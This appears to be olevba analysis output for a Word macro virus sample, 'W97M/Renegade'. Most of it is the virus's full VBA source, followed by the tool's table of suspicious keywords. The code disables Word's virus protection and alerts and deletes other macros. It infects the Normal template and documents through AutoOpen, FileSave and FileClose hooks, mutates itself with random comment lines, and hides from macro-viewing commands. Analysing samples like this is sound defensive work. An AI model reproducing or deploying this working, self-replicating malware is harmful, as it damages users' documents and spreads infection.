olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Reneg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Reneg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Renegade.bas 
in file: Virus.MSWord.Reneg - OLE stream: 'Macros/VBA/Renegade'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Renegade()
'W97M/Renegade
'Copyright (c) 1999, cry0tek
On Error Resume Next
With Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
With ActiveDocument
 .ReadOnlyRecommended = False
 .Password = ""
 .WritePassword = ""
End With
With Application
 .ScreenUpdating = False
 .DisplayAlerts = wdAlertsNone
 .EnableCancelKey = False
 .VBE.ActiveVBProject.VBComponents("Renegade").Export "c:\renegade.386"
End With
With Dialogs(wdDialogFileSummaryInfo)
 .Author = "cry0tek"
 .Title = "W97M/Renegade Infected Document"
 .Subject = "Copyright (c) 1999, cry0tek"
 .Comments = "PutoksaKawayan" & vbcr & "Zoom23" & vbcr & "L0rz" & vbcr & "Yez" & vbcr & "Kinetic Stab"
 .Keywords = "Greetings to all vx'ers"
 .Execute
End With
If Day(Now()) = 5 Then
 Assistant.Visible = True
 With Assistant.NewBalloon
  .Text = "W97M/Renegade"
  .Heading = "Infection successful.....you're dead..."
  .Animation = msoAnimationEmptyTrash
  .Show
 End With
End If
NormalAttrib = GetAttr(NormalTemplate.FullName)
If NormalAttrib = vbReadOnly Then GoTo Hell
If NormalAttrib = vbReadOnly + vbArchive Then GoTo Hell
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 Macro = ActiveDocument.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then DocInf = True
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") And (Macro <> "Reference To Normal") Then
  Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 Macro = NormalTemplate.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then GlobalInf = True
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") Then
  Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
If DocInf = True And GlobalInf = False Then Set Target = NormalTemplate.VBProject.VBComponents
If DocInf = False And GlobalInf = True Then Set Target = ActiveDocument.VBProject.VBComponents
Target.Import "c:\renegade.386"
If DocInf = False Then ActiveDocument.SaveAs Filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If GlobalInf = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Kill "c:\renegade.386"
Application.DisplayAlerts = wdAlertsAll
Hell:
End Sub
Sub Mutate()
On Error Resume Next
For Grow = 1 To 5
 Number = MacroContainer.VBProject.VBComponents("Renegade").CodeModule.CountofLines
 RandomLine = Int(Rnd() * Number - 2)
 RemarkLength = Int(Rnd() * 40 + 1)
 For Length = 1 To RemarkLength
  Remark = Remark + Chr$(Int((122 - 65 + 1) * Rnd + 65))
 Next Length
 MacroContainer.VBProject.VBComponents("Renegade").CodeModule.InsertLines RandomLine, "Rem " & Remark
 Remark = ""
Next Grow
End Sub
Sub FileClose()
On Error Resume Next
Call Mutate
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub AutoOpen()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileSave()
On Error Resume Next
Call Renegade
ActiveDocument.Save
End Sub
Sub FileExit()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Sub ToolsOptions()
On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
Call Renegade
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplate()
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

